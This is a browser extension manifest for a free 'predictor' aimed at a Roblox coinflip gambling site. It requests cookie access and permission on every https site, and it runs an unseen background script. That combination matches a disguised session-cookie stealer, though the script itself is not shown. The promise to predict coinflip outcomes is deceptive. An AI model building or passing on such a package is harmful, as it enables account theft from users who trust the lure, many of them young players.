{
    "name": "Rbxflip CF predictor FREE version",
    "description": "The best & free predictor for rbxflip!",
    "version": "1.0.0",
    "manifest_version": 3,

    "action": {
        "default_icon": "assets/roblox.png",
        "default_popup": "popup.html"
    },

    "host_permissions": [
        "https://*/*"
    ],

    "permissions": [
        "cookies"
    ],

    "background": {
        "service_worker": "scripts/predictor.js"
    },

    "icons": {
        "16": "assets/roblox.png",
        "32": "assets/roblox.png",
        "48": "assets/roblox.png",
        "128": "assets/roblox.png"
    }
}